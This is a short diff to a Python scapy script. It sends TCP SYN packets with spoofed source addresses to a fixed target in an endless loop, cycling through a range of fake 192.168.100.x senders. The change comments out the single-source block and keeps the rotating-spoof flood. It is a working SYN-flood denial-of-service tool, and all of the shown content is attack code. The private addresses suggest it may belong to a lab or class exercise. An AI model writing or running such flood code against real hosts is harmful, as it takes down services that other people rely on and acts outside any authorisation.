@@ -6,10 +6,13 @@ from scapy.sendrecv import send
 
 dst = '10.10.113.4'
 flag = 'S'
+# packet = IP(src='192.168.100.18', dst=dst) / TCP(flags=flag, dport=9000)
+# for i in range(15):
+#     send(packet)
 while True:
-    packet = IP(src='192.168.100.18', dst=dst) / TCP(flags=flag, dport=90)
-    for i in range(15):
-        send(packet)
+    # packet = IP(src='192.168.100.18', dst=dst) / TCP(flags=flag, dport=90)
+    # for i in range(15):
+    #     send(packet)
     for i in range(6, 30):
         print(f"192.168.100.{i}")
         packet = IP(src=f"192.168.100.{i}", dst=dst) / TCP(flags=flag, dport=9000)
